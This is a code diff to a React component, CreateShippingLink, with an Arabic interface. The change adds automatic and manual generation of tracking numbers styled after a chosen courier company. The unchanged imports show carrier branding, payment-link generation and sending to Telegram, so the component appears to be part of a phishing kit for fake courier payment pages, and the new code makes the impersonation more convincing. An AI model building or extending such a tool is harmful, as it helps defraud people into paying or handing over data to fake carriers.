@@ -1,4 +1,4 @@
-import { useState, useMemo } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -14,7 +14,8 @@ import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } f
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
-import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User } from "lucide-react";
+import { generateCompanyTrackingNumber } from "@/utils/trackingNumber";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User, RefreshCw } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -61,6 +62,26 @@ const CreateShippingLink = () => {
     selectedService ? getServiceBranding(selectedService) : null,
     [selectedService]
   );
+
+  // Auto-generate tracking number when service is selected
+  useEffect(() => {
+    if (selectedService && !trackingNumber) {
+      const generatedNumber = generateCompanyTrackingNumber(selectedService);
+      setTrackingNumber(generatedNumber);
+    }
+  }, [selectedService]);
+
+  // Function to manually regenerate tracking number
+  const handleRegenerateTracking = () => {
+    if (selectedService) {
+      const generatedNumber = generateCompanyTrackingNumber(selectedService);
+      setTrackingNumber(generatedNumber);
+      toast({
+        title: "تم التوليد",
+        description: "تم إنشاء رقم شحنة جديد",
+      });
+    }
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -248,14 +269,32 @@ const CreateShippingLink = () => {
                 <Label className="mb-2 flex items-center gap-2 text-sm">
                   <Hash className="w-3 h-3" />
                   رقم الشحنة *
+                  <span className="text-[10px] text-muted-foreground mr-auto">(يتم التوليد تلقائياً)</span>
                 </Label>
-                <Input
-                  value={trackingNumber}
-                  onChange={(e) => setTrackingNumber(e.target.value)}
-                  placeholder="مثال: 1234567890"
-                  className="h-9 text-sm"
-                  required
-                />
+                <div className="flex gap-2">
+                  <Input
+                    value={trackingNumber}
+                    onChange={(e) => setTrackingNumber(e.target.value)}
+                    placeholder="سيتم التوليد تلقائياً"
+                    className="h-9 text-sm font-mono"
+                    required
+                  />
+                  <Button
+                    type="button"
+                    variant="outline"
+                    size="icon"
+                    onClick={handleRegenerateTracking}
+                    disabled={!selectedService}
+                    title="توليد رقم جديد"
+                  >
+                    <RefreshCw className="w-4 h-4" />
+                  </Button>
+                </div>
+                {selectedService && (
+                  <p className="text-[10px] text-muted-foreground mt-1">
+                    ✅ تم التوليد تلقائياً بناءً على الشركة المختارة
+                  </p>
+                )}
               </div>
 
               {/* Payer Type Selection */}
